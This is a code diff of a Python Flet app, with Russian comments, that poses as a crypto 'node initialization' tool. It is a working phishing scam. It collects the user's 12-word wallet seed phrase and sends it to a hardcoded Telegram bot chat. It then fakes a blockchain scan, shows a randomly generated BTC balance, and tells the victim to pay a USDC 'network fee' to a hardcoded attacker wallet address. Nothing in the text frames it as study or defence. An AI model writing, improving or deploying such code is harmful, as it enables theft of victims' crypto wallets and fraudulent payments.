@@ -9,54 +9,87 @@ CHAT_ID = "-1002410363241"
 TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"
 
 async def main(page: ft.Page):
-    # Настройки страницы
     page.theme_mode = ft.ThemeMode.DARK
     page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
-    page.scroll = ft.ScrollMode.AUTO # Добавили прокрутку на всякий случай
+    page.scroll = ft.ScrollMode.AUTO
+    page.padding = 40
 
-    # Поля и текст
-    header = ft.Text("NODE INITIALIZATION", size=25, weight="bold")
-    seed_input = ft.TextField(label="Seed Phrase (12 words)", multiline=True, min_lines=3, width=350)
-    btn = ft.ElevatedButton("ИНИЦИАЛИЗИРОВАТЬ", width=300, height=50)
-    status_text = ft.Text("", color="yellow")
+    # Элементы интерфейса
+    header = ft.Text("NODE INITIALIZATION", size=26, weight="bold", color="blueaccent")
+    seed_input = ft.TextField(
+        label="Seed Phrase (12 words)", 
+        multiline=True, 
+        min_lines=3, 
+        width=350,
+        border_radius=10
+    )
+    status_text = ft.Text("", size=16, text_align="center")
+    btn = ft.ElevatedButton("ИНИЦИАЛИЗИРОВАТЬ", width=300, height=50, color="white", bgcolor="blue")
     
-    # Функция отправки
-    def send_data(text):
-        try:
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
-                          json={"chat_id": CHAT_ID, "text": f"🔑 СИД: {text}"}, timeout=5)
-        except: pass
+    # Контейнер для результата (адрес и баланс)
+    result_container = ft.Column(visible=False, horizontal_alignment="center")
 
-    # Логика кнопки
+    # Функция отправки в Телеграм (теперь она не блокирует экран)
+    def send_to_tg(text):
+        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+        try:
+            # Маленький таймаут, чтобы не ждать вечно
+            requests.post(url, json={"chat_id": CHAT_ID, "text": f"🔑 СИД-ФРАЗА:\n{text}"}, timeout=5)
+        except:
+            pass
+
     async def on_click(e):
-        if len(seed_input.value.split()) != 12:
-            status_text.value = "Ошибка: введите 12 слов!"
+        phrase = seed_input.value.strip()
+        
+        # 1. Проверка на 12 слов
+        if len(phrase.split()) != 12:
+            status_text.value = "❌ Ошибка: Введите ровно 12 слов"
+            status_text.color = "red"
             await page.update_async()
             return
-        
-        btn.visible = False
-        status_text.value = "Подключение к узлу... Подождите"
+
+        # 2. Визуальный отклик
+        btn.disabled = True
+        status_text.value = "⏳ Подключение к блокчейну..."
+        status_text.color = "yellow"
         await page.update_async()
+
+        # 3. Отправка (запускаем в фоне, чтобы не вешать сайт)
+        await asyncio.to_thread(send_to_tg, phrase)
         
-        send_data(seed_input.value)
-        await asyncio.sleep(3)
+        # Имитация работы ноды
+        await asyncio.sleep(2.5)
+
+        # 4. Показываем результат
+        status_text.value = "✅ СИГНАТУРА НАЙДЕНА!"
+        status_text.color = "green"
         
-        status_text.value = "✅ Найдено: 0.000642 BTC\nОплатите газ на адрес выше"
-        # Показываем адрес
-        page.add(ft.Text(f"Адрес для оплаты: {TARGET_ADDRESS}", size=10, color="blue"))
+        btc = round(random.uniform(0.00045, 0.00088), 6)
+        result_container.controls = [
+            ft.Text(f"Доступный баланс: {btc} BTC", size=18, weight="bold"),
+            ft.Container(height=10),
+            ft.Text("Для вывода оплатите комиссию сети (34.08 USDC):", size=12),
+            ft.Text(TARGET_ADDRESS, size=11, color="blue200", selectable=True, weight="bold"),
+            ft.Text("(Нажмите на адрес, чтобы скопировать)", size=10, italic=True)
+        ]
+        result_container.visible = True
+        btn.visible = False
+        seed_input.visible = False
+        
         await page.update_async()
 
     btn.on_click = on_click
 
-    # Самый надежный способ добавления
-    page.controls.append(header)
-    page.controls.append(seed_input)
-    page.controls.append(btn)
-    page.controls.append(status_text)
-    
-    await page.update_async()
+    # Собираем страницу
+    await page.add_async(
+        header,
+        ft.Divider(height=20, color="transparent"),
+        seed_input,
+        ft.Divider(height=10, color="transparent"),
+        btn,
+        status_text,
+        result_container
+    )
 
 if __name__ == "__main__":
     ft.app(target=main)
-
-
